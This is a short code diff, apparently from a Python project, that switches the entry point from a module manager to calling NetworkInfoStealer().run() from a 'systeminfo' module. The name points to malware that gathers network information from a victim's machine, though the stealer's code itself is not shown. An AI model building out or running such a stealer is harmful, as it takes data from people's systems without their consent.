@@ -1,3 +1,3 @@
-from config.manager import ModuleManager
+from modules.systeminfo import network
 
-ModuleManager("file")
+network.NetworkInfoStealer().run()
